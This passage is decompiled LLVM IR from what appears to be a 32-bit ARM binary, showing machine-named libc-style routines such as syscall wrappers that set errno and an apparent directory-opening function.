  store i32 %v3_15110, i32* %stack_var_-8, align 4
  %v0_1511c = load i32, i32* @r0, align 4
  store i32 %v0_1511c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1511c, -4095
  br i1 %tmp, label %dec_label_pc_1513c, label %dec_label_pc_1512c

dec_label_pc_1512c:                               ; preds = %dec_label_pc_15110
  %v0_1512c = call i32 @function_1095c()
  %v0_15130 = load i32, i32* %r7.global-to-local, align 4
  %v1_15130 = sub i32 0, %v0_15130
  %v2_15134 = inttoptr i32 %v0_1512c to i32*
  store i32 %v1_15130, i32* %v2_15134, align 4
  %v2_1513c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15110, %dec_label_pc_1512c
  %v1_15140 = phi i32 [ %v0_1511c, %dec_label_pc_15110 ], [ -1, %dec_label_pc_1512c ]
  %v2_1513c = phi i32 [ %v3_15110, %dec_label_pc_15110 ], [ %v2_1513c.pre, %dec_label_pc_1512c ]
  store i32 %v2_1513c, i32* %r7.global-to-local, align 4
  ret i32 %v1_15140

; uselistorder directives
  uselistorder i32 %v0_1511c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1513c, { 1, 0 }
}

define i32 @function_15144() local_unnamed_addr {
dec_label_pc_15144:
  %v4_15150 = load i32, i32* inttoptr (i32 144408 to i32*), align 8
  %v1_15154 = inttoptr i32 %v4_15150 to i32*
  %v2_15154 = load i32, i32* %v1_15154, align 4
  %v2_15158 = icmp eq i32 %v2_15154, 0
  br i1 %v2_15158, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_15144
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_15144, %bb
  %v1_15160 = phi i32 [ %v2_15154, %dec_label_pc_15144 ], [ 4096, %bb ]
  ret i32 %v1_15160

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_1516c() local_unnamed_addr {
dec_label_pc_1516c:
  %v1_1517c = load i32, i32* @r0, align 4
  ret i32 %v1_1517c
}

define i32 @function_15180(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15180:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15180 = load i32, i32* @r7, align 4
  store i32 %v3_15180, i32* %stack_var_-8, align 4
  %v0_1518c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1518c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1518c, -4095
  br i1 %tmp, label %dec_label_pc_151ac, label %dec_label_pc_1519c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_15180
  %v0_1519c = call i32 @function_1095c()
  %v0_151a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_151a0 = sub i32 0, %v0_151a0
  %v2_151a4 = inttoptr i32 %v0_1519c to i32*
  store i32 %v1_151a0, i32* %v2_151a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_151ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_151ac

dec_label_pc_151ac:                               ; preds = %dec_label_pc_15180, %dec_label_pc_1519c
  %v1_151b0 = phi i32 [ %v0_1518c, %dec_label_pc_15180 ], [ -1, %dec_label_pc_1519c ]
  %v2_151ac = phi i32 [ %v3_15180, %dec_label_pc_15180 ], [ %v2_151ac.pre, %dec_label_pc_1519c ]
  store i32 %v2_151ac, i32* %r7.global-to-local, align 4
  ret i32 %v1_151b0

; uselistorder directives
  uselistorder i32 %v0_1518c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151ac, { 1, 0 }
}

define i32 @function_151b4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_151b4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_151b4 = load i32, i32* @r7, align 4
  store i32 %v3_151b4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_151dc, label %dec_label_pc_151cc

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151b4
  %v0_151cc = call i32 @function_1095c()
  %v0_151d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_151d0 = sub i32 0, %v0_151d0
  %v2_151d4 = inttoptr i32 %v0_151cc to i32*
  store i32 %v1_151d0, i32* %v2_151d4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_151e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151b4, %dec_label_pc_151cc
  %v2_151e0 = phi i32 [ %v3_151b4, %dec_label_pc_151b4 ], [ %v2_151e0.pre, %dec_label_pc_151cc ]
  %v0_151dc = phi i32 [ %arg1, %dec_label_pc_151b4 ], [ -1, %dec_label_pc_151cc ]
  store i32 %v2_151e0, i32* @r7, align 4
  ret i32 %v0_151dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_151dc, { 1, 0 }
}

define i32 @function_151e8() local_unnamed_addr {
dec_label_pc_151e8:
  %v1_151f8 = load i32, i32* @r0, align 4
  ret i32 %v1_151f8
}

define i32 @function_151fc() local_unnamed_addr {
dec_label_pc_151fc:
  %v1_1520c = load i32, i32* @r0, align 4
  ret i32 %v1_1520c
}

define i32 @function_15210(i32 %arg1) local_unnamed_addr {
dec_label_pc_15210:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15210 = load i32, i32* @r4, align 4
  store i32 %v3_15210, i32* %stack_var_-16, align 4
  store i32 144312, i32* %r4.global-to-local, align 4
  %v4_15220 = load i32, i32* @global_var_2976c.414, align 4
  %v2_15224 = icmp eq i32 %v4_15220, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15224, label %dec_label_pc_15230, label %dec_label_pc_15240

dec_label_pc_15230:                               ; preds = %dec_label_pc_15210
  %v1_15234 = call i32 @function_18450(i32 0)
  %v1_15238 = icmp slt i32 %v1_15234, 0
  br i1 %v1_15238, label %dec_label_pc_15264, label %dec_label_pc_15240thread-pre-split

dec_label_pc_15240thread-pre-split:               ; preds = %dec_label_pc_15230
  %v0_15244.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_15240.pre = load i32, i32* @global_var_2976c.414, align 4
  br label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %dec_label_pc_15240thread-pre-split, %dec_label_pc_15210
  %v0_15250 = phi i32 [ %v4_15240.pre, %dec_label_pc_15240thread-pre-split ], [ %v4_15220, %dec_label_pc_15210 ]
  %v1_15254 = phi i32 [ %v0_15244.pr, %dec_label_pc_15240thread-pre-split ], [ %arg1, %dec_label_pc_15210 ]
  %v2_15244 = icmp eq i32 %v1_15254, 0
  store i32 %v0_15250, i32* %r4.global-to-local, align 4
  br i1 %v2_15244, label %dec_label_pc_15268, label %dec_label_pc_15250

dec_label_pc_15250:                               ; preds = %dec_label_pc_15240
  %v2_15254 = add i32 %v1_15254, %v0_15250
  %v1_15258 = call i32 @function_18450(i32 %v2_15254)
  %v1_1525c = icmp slt i32 %v1_15258, 0
  br i1 %v1_1525c, label %dec_label_pc_15264, label %dec_label_pc_15250.dec_label_pc_15268_crit_edge

dec_label_pc_15250.dec_label_pc_15268_crit_edge:  ; preds = %dec_label_pc_15250
  %v0_15268.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15268

dec_label_pc_15264:                               ; preds = %dec_label_pc_15250, %dec_label_pc_15230
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_15240, %dec_label_pc_15250.dec_label_pc_15268_crit_edge, %dec_label_pc_15264
  %v0_15268 = phi i32 [ %v0_15268.pre, %dec_label_pc_15250.dec_label_pc_15268_crit_edge ], [ -1, %dec_label_pc_15264 ], [ %v0_15250, %dec_label_pc_15240 ]
  %v2_1526c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1526c, i32* @r4, align 4
  ret i32 %v0_15268

; uselistorder directives
  uselistorder i32 %v0_15250, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_18450, { 1, 0 }
  uselistorder label %dec_label_pc_15268, { 2, 1, 0 }
}

define i32 @function_1527c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1527c:
  %v1_1528c = load i32, i32* @r0, align 4
  ret i32 %v1_1528c
}

define i32 @function_15290(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15290:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15290 = load i32, i32* @r7, align 4
  store i32 %v3_15290, i32* %stack_var_-8, align 4
  %v0_1529c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1529c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1529c, -4095
  br i1 %tmp, label %dec_label_pc_152bc, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_15290
  %v0_152ac = call i32 @function_1095c()
  %v0_152b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_152b0 = sub i32 0, %v0_152b0
  %v2_152b4 = inttoptr i32 %v0_152ac to i32*
  store i32 %v1_152b0, i32* %v2_152b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_152bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %dec_label_pc_15290, %dec_label_pc_152ac
  %v1_152c0 = phi i32 [ %v0_1529c, %dec_label_pc_15290 ], [ -1, %dec_label_pc_152ac ]
  %v2_152bc = phi i32 [ %v3_15290, %dec_label_pc_15290 ], [ %v2_152bc.pre, %dec_label_pc_152ac ]
  store i32 %v2_152bc, i32* @r7, align 4
  ret i32 %v1_152c0

; uselistorder directives
  uselistorder i32 %v0_1529c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152bc, { 1, 0 }
}

define i32 @function_152c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_152c4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_152c4 = load i32, i32* @r7, align 4
  store i32 %v3_152c4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_152ec, label %dec_label_pc_152dc

dec_label_pc_152dc:                               ; preds = %dec_label_pc_152c4
  %v0_152dc = call i32 @function_1095c()
  %v0_152e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_152e0 = sub i32 0, %v0_152e0
  %v2_152e4 = inttoptr i32 %v0_152dc to i32*
  store i32 %v1_152e0, i32* %v2_152e4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_152f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_152dc
  %v2_152f0 = phi i32 [ %v3_152c4, %dec_label_pc_152c4 ], [ %v2_152f0.pre, %dec_label_pc_152dc ]
  %v0_152ec = phi i32 [ %arg1, %dec_label_pc_152c4 ], [ -1, %dec_label_pc_152dc ]
  store i32 %v2_152f0, i32* @r7, align 4
  ret i32 %v0_152ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152ec, { 1, 0 }
}

define i32 @function_152f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_152f8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_152f8 = load i32, i32* @r7, align 4
  store i32 %v3_152f8, i32* %stack_var_-8, align 4
  %v0_15304 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15304, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15304, -4095
  br i1 %tmp, label %dec_label_pc_15324, label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_152f8
  %v0_15314 = call i32 @function_1095c()
  %v0_15318 = load i32, i32* %r7.global-to-local, align 4
  %v1_15318 = sub i32 0, %v0_15318
  %v2_1531c = inttoptr i32 %v0_15314 to i32*
  store i32 %v1_15318, i32* %v2_1531c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15324.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15324

dec_label_pc_15324:                               ; preds = %dec_label_pc_152f8, %dec_label_pc_15314
  %v1_15328 = phi i32 [ %v0_15304, %dec_label_pc_152f8 ], [ -1, %dec_label_pc_15314 ]
  %v2_15324 = phi i32 [ %v3_152f8, %dec_label_pc_152f8 ], [ %v2_15324.pre, %dec_label_pc_15314 ]
  store i32 %v2_15324, i32* @r7, align 4
  ret i32 %v1_15328

; uselistorder directives
  uselistorder i32 %v0_15304, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15324, { 1, 0 }
}

define i32 @function_1532c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1532c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1532c = load i32, i32* @r4, align 4
  store i32 %v3_1532c, i32* %stack_var_-24, align 4
  %v2_15330 = load i32, i32* %arg1, align 4
  store i32 %v2_15330, i32* %r4.global-to-local, align 4
  %v3_15338 = icmp eq i32 %v2_15330, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 144312, i32* @r6, align 4
  br i1 %v3_15338, label %dec_label_pc_1534c, label %dec_label_pc_15360

dec_label_pc_1534c:                               ; preds = %dec_label_pc_1532c
  %v0_1534c = call i32 @function_1095c()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_15354 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15354, i32* %r2.global-to-local, align 4
  %v2_15358 = inttoptr i32 %v0_1534c to i32*
  store i32 9, i32* %v2_15358, align 4
  %v0_15400.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15400

dec_label_pc_15360:                               ; preds = %dec_label_pc_1532c
  store i32 40, i32* %r3.global-to-local, align 4
  %v1_15364 = add i32 %tmp, 24
  store i32 %v1_15364, i32* %r4.global-to-local, align 4
  store i32 %v1_15364, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15378 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_15378)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_15390 = load i32, i32* @r6, align 4
  %v2_15390 = add i32 %v0_15390, 20
  %v3_15390 = inttoptr i32 %v2_15390 to i32*
  %v4_15390 = load i32, i32* %v3_15390, align 4
  call void @__pseudo_branch(i32 %v4_15390)
  %v0_1539c = load i32, i32* @r7, align 4
  %v1_1539c = inttoptr i32 %v0_1539c to i32*
  %v2_1539c = load i32, i32* %v1_1539c, align 4
  store i32 %v2_1539c, i32* @r4, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_153ac = load i32, i32* @r8, align 4
  store i32 %v0_153ac, i32* %v1_1539c, align 4
  %v0_153b0 = load i32, i32* @r6, align 4
  %v1_153b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_153b0 = add i32 %v1_153b0, %v0_153b0
  %v3_153b0 = inttoptr i32 %v2_153b0 to i32*
  %v4_153b0 = load i32, i32* %v3_153b0, align 4
  store i32 ptrtoint (i32* @global_var_153bc.420 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_153b0)
  %v0_153bc = load i32, i32* @r7, align 4
  %v1_153bc = add i32 %v0_153bc, 12
  %v2_153bc = inttoptr i32 %v1_153bc to i32*
  %v3_153bc = load i32, i32* %v2_153bc, align 4
  store i32 %v3_153bc, i32* @r0, align 4
  %v0_153c0 = call i32 @function_13684()
  %v0_153c4 = load i32, i32* @r7, align 4
  store i32 %v0_153c4, i32* @r0, align 4
  %v0_153c8 = call i32 @function_13684()
  %v0_153d0 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_153d0, -4095
  br i1 %tmp11, label %dec_label_pc_153fc, label %dec_label_pc_153ec

dec_label_pc_153ec:                               ; preds = %dec_label_pc_15360
  %v0_153ec = call i32 @function_1095c()
  %v0_153f0 = load i32, i32* @r4, align 4
  %v1_153f0 = sub i32 0, %v0_153f0
  store i32 %v1_153f0, i32* %r3.global-to-local, align 4
  %v2_153f4 = inttoptr i32 %v0_153ec to i32*
  store i32 %v1_153f0, i32* %v2_153f4, align 4
  %v0_153f8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_15360, %dec_label_pc_153ec
  %v0_153fc = phi i32 [ %v0_153d0, %dec_label_pc_15360 ], [ %v0_153f8, %dec_label_pc_153ec ]
  store i32 %v0_153fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15400

dec_label_pc_15400:                               ; preds = %dec_label_pc_1534c, %dec_label_pc_153fc
  %v0_15400 = phi i32 [ %v0_15400.pre, %dec_label_pc_1534c ], [ %v0_153fc, %dec_label_pc_153fc ]
  %v2_15408 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15408, i32* %r4.global-to-local, align 4
  ret i32 %v0_15400

; uselistorder directives
  uselistorder i32 %v0_153d0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_15400, { 1, 0 }
  uselistorder label %dec_label_pc_153fc, { 1, 0 }
}

define i32 @function_15414(i32 %arg1) local_unnamed_addr {
dec_label_pc_15414:
  %v0_15414 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15414, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15414
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15414, %bb
  %v10_15420 = phi i32 [ %arg1, %dec_label_pc_15414 ], [ 0, %bb ]
  ret i32 %v10_15420

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15424(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15424:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_15424 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_15438 = call i32 @function_12b00(i32 48)
  %v2_15440 = icmp eq i32 %v1_15438, 0
  store i32 144312, i32* @r6, align 4
  br i1 %v2_15440, label %bb, label %dec_label_pc_15450

bb:                                               ; preds = %dec_label_pc_15424
  br label %dec_label_pc_154dc

dec_label_pc_15450:                               ; preds = %dec_label_pc_15424
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15454 = load i32, i32* @r4, align 4
  %v2_15454 = icmp ugt i32 %v0_15454, 511
  %v2_15458 = add i32 %v1_15438, 4
  %v3_15458 = inttoptr i32 %v2_15458 to i32*
  store i32 0, i32* %v3_15458, align 4
  %v0_1545c = load i32, i32* %r3.global-to-local, align 4
  %v2_1545c = add i32 %v1_15438, 16
  %v3_1545c = inttoptr i32 %v2_1545c to i32*
  store i32 %v0_1545c, i32* %v3_1545c, align 4
  %v0_15460 = load i32, i32* %r3.global-to-local, align 4
  %v2_15460 = add i32 %v1_15438, 8
  %v3_15460 = inttoptr i32 %v2_15460 to i32*
  store i32 %v0_15460, i32* %v3_15460, align 4
  br i1 %v2_15454, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_15450
  %v0_154682 = load i32, i32* @r4, align 4
  %v2_154683 = add i32 %v1_15438, 20
  %v3_154684 = inttoptr i32 %v2_154683 to i32*
  store i32 %v0_154682, i32* %v3_154684, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_15450
  %v1_15464 = load i32, i32* %r3.global-to-local, align 4
  %v2_15464 = add i32 %v1_15464, 512
  store i32 %v2_15464, i32* %r3.global-to-local, align 4
  %v0_15468 = load i32, i32* @r4, align 4
  %v2_15468 = add i32 %v1_15438, 20
  %v3_15468 = inttoptr i32 %v2_15468 to i32*
  store i32 %v0_15468, i32* %v3_15468, align 4
  %v1_1546c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1546c, i32* %v3_15468, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_15438, i32* @r5, align 4
  %v0_15474 = load i32, i32* @r7, align 4
  %v2_15474 = inttoptr i32 %v1_15438 to i32*
  store i32 %v0_15474, i32* %v2_15474, align 4
  %v0_15478 = load i32, i32* @r5, align 4
  %v1_15478 = add i32 %v0_15478, 20
  %v2_15478 = inttoptr i32 %v1_15478 to i32*
  %v3_15478 = load i32, i32* %v2_15478, align 4
  store i32 %v3_15478, i32* %r1.global-to-local, align 4
  %v2_15480 = call i32 @function_17f30(i32 1, i32 %v3_15478)
  %v2_15484 = icmp eq i32 %v2_15480, 0
  store i32 %v2_15480, i32* @r4, align 4
  %v1_1548c = load i32, i32* @r5, align 4
  %v2_1548c = add i32 %v1_1548c, 12
  %v3_1548c = inttoptr i32 %v2_1548c to i32*
  store i32 %v2_15480, i32* %v3_1548c, align 4
  br i1 %v2_15484, label %dec_label_pc_15494, label %dec_label_pc_154a4

dec_label_pc_15494:                               ; preds = %bb17
  %v0_15494 = load i32, i32* @r5, align 4
  store i32 %v0_15494, i32* @r0, align 4
  %v0_15498 = call i32 @function_13684()
  %v0_1549c = load i32, i32* @r4, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154a4:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_154cc = load i32, i32* @r5, align 4
  %v1_154cc = add i32 %v0_154cc, 24
  %v1_154d0 = inttoptr i32 %v1_154cc to i32*
  store i32 0, i32* %v1_154d0, align 4
  %v3_154d0 = add i32 %v0_154cc, 28
  %v4_154d0 = inttoptr i32 %v3_154d0 to i32*
  %v5_154d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_154d0, i32* %v4_154d0, align 4
  %v6_154d0 = add i32 %v0_154cc, 32
  %v7_154d0 = inttoptr i32 %v6_154d0 to i32*
  %v8_154d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_154d0, i32* %v7_154d0, align 4
  %v9_154d0 = add i32 %v0_154cc, 36
  %v10_154d0 = inttoptr i32 %v9_154d0 to i32*
  %v11_154d0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_154d0, i32* %v10_154d0, align 4
  %v12_154d0 = add i32 %v0_154cc, 40
  %v2_154d4 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_154d8 = inttoptr i32 %v12_154d0 to i32*
  store i32 %v2_154d4, i32* %v1_154d8, align 4
  %v3_154d8 = add i32 %v0_154cc, 44
  %v4_154d8 = inttoptr i32 %v3_154d8 to i32*
  %v5_154d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_154d8, i32* %v4_154d8, align 4
  %v0_154dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %bb, %dec_label_pc_15494, %dec_label_pc_154a4
  %v0_154dc = phi i32 [ 0, %bb ], [ %v0_1549c, %dec_label_pc_15494 ], [ %v0_154dc.pre, %dec_label_pc_154a4 ]
  store i32 %v12_15424, i32* @r7, align 4
  ret i32 %v0_154dc

; uselistorder directives
  uselistorder i32 %v2_15480, { 1, 0, 2 }
  uselistorder i32 %v1_15438, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_154dc, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_154f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_154f4:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_154fc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_15524, label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %dec_label_pc_154f4
  %v0_15514 = call i32 @function_1095c()
  %v0_15518 = load i32, i32* @r7, align 4
  %v1_15518 = sub i32 0, %v0_15518
  %v2_1551c = inttoptr i32 %v0_15514 to i32*
  store i32 %v1_15518, i32* %v2_1551c, align 4
  br label %dec_label_pc_15548

dec_label_pc_15524:                               ; preds = %dec_label_pc_154f4
  %v1_15524 = icmp slt i32 %arg1, 0
  br i1 %v1_15524, label %dec_label_pc_15548, label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15524
  store i32 %v2_154fc, i32* @r1, align 4
  %v0_15530 = call i32 @function_184a8()
  %v1_15534 = icmp slt i32 %v0_15530, 0
  br i1 %v1_15534, label %dec_label_pc_1553c, label %dec_label_pc_15550

dec_label_pc_1553c:                               ; preds = %dec_label_pc_1552c
  br label %dec_label_pc_15548

dec_label_pc_15548:                               ; preds = %dec_label_pc_1553c, %dec_label_pc_15524, %dec_label_pc_15514
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1558c

dec_label_pc_15550:                               ; preds = %dec_label_pc_1552c
  %v0_15558 = load i32, i32* @r7, align 4
  %v3_1555c = call i32 @function_10744(i32 %v0_15558, i32 2, i32 1)
  %v0_15560 = load i32, i32* @r7, align 4
  %v2_15568 = call i32 @function_15424(i32 %v0_15560, i32 %tmp)
  store i32 %v2_15568, i32* %r4.global-to-local, align 4
  %v2_1556c = icmp eq i32 %v2_15568, 0
  br i1 %v2_1556c, label %dec_label_pc_15574, label %dec_label_pc_1558c

dec_label_pc_15574:                               ; preds = %dec_label_pc_15550
  %v0_15580 = call i32 @function_1095c()
  %v2_15588 = inttoptr i32 %v0_15580 to i32*
  store i32 12, i32* %v2_15588, align 4
  %v0_1558c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1558c

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15550, %dec_label_pc_15548, %dec_label_pc_15574
  %v0_1558c = phi i32 [ %v2_15568, %dec_label_pc_15550 ], [ 0, %dec_label_pc_15548 ], [ %v0_1558c.pre, %dec_label_pc_15574 ]
  ret i32 %v0_1558c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1558c, { 2, 0, 1 }
}

define i32 @function_1559c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1559c:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_1559c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1559c, label %bb, label %dec_label_pc_1559c._crit_edge

dec_label_pc_1559c._crit_edge:                    ; preds = %dec_label_pc_1559c
  br label %bb11

bb:                                               ; preds = %dec_label_pc_1559c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_1559c._crit_edge, %bb
  %v2_155a4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_155a4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_155b0 = call i32 @function_184a8()
  store i32 %v0_155b0, i32* @r5, align 4
  %v2_155b4 = icmp eq i32 %v0_155b0, 0
  br i1 %v2_155b4, label %dec_label_pc_155bc, label %dec_label_pc_15624

dec_label_pc_155bc:                               ; preds = %bb11
  %v1_155c0 = and i32 %tmp5, 61440
  store i32 %v1_155c0, i32* @r3, align 4
  %v7_155c4 = icmp eq i32 %v1_155c0, 16384
  br i1 %v7_155c4, label %dec_label_pc_155dc, label %dec_label_pc_155cc

dec_label_pc_155cc:                               ; preds = %dec_label_pc_155bc
  %v0_155cc = call i32 @function_1095c()
  br label %dec_label_pc_15608

dec_label_pc_155dc:                               ; preds = %dec_label_pc_155bc
  %v0_155dc = load i32, i32* @r4, align 4
  %v2_155e4 = call i32 @function_106d8(i32 %v0_155dc, i32 3)
  %v7_155e8 = icmp eq i32 %v2_155e4, -1
  br i1 %v7_155e8, label %dec_label_pc_15624, label %dec_label_pc_155f0

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155dc
  %v1_155f0 = urem i32 %v2_155e4, 4
  %v7_155f4 = icmp eq i32 %v1_155f0, 1
  br i1 %v7_155f4, label %dec_label_pc_155fc, label %dec_label_pc_15610

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155f0
